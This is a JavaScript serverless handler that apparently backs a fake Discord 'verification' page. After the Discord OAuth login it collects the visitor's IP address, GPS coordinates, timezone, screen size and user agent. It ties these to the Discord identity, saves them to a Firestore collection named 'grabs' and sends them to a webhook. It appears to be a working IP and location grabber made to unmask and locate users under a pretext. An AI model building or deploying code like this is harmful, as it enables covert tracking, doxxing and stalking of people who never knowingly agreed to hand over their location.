import axios from 'axios';
import admin from 'firebase-admin';

const serviceAccount = JSON.parse(process.env.FIREBASE_JSON);

if (!admin.apps.length) {
  admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
}

const db = admin.firestore();

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

  const {
    code,
    platform,
    screenResolution,
    userAgent,
    language,
    timezone,
    latitude,
    longitude
  } = req.body;

  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const timestamp = new Date();
  const ts = {
    seconds: Math.floor(timestamp.getTime() / 1000),
    nanoseconds: (timestamp.getTime() % 1000) * 1e6
  };

  let discordUserId = 'unknown';
  let discordUsername = 'unknown';

  try {
    const tokenRes = await axios.post('https://discord.com/api/oauth2/token',
      new URLSearchParams({
        client_id: process.env.CLIENT_ID,
        client_secret: process.env.CLIENT_SECRET,
        grant_type: 'authorization_code',
        code,
        redirect_uri: process.env.REDIRECT_URI,
        scope: 'identify'
      }), {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
      });

    const accessToken = tokenRes.data.access_token;

    const userRes = await axios.get('https://discord.com/api/users/@me', {
      headers: { Authorization: `Bearer ${accessToken}` }
    });

    discordUserId = userRes.data.id;
    discordUsername = `${userRes.data.username}#${userRes.data.discriminator}`;
  } catch (err) {
    console.error('OAuth Error:', err.response?.data || err.message);
  }

  const data = {
    ip,
    code,
    discordUserId,
    discordUsername,
    latitude,
    longitude,
    timezone,
    platform,
    screenResolution,
    userAgent,
    language,
    timestamp: timestamp.toISOString(),
    ts
  };

  try {
    await db.collection('grabs').add(data);
    await axios.post(process.env.WEBHOOK_URL, {
      content: `**New Verification Data**\nUser: ${discordUsername}\nID: ${discordUserId}\nIP: ${ip}\nPlatform: ${platform}\nResolution: ${screenResolution}\nLocation: ${latitude}, ${longitude}\nLang: ${language} | TZ: ${timezone}\nUA: ${userAgent}`
    });
  } catch (err) {
    console.error('Logging/Webhook error:', err.message);
  }

  res.status(200).json({ success: true });
}
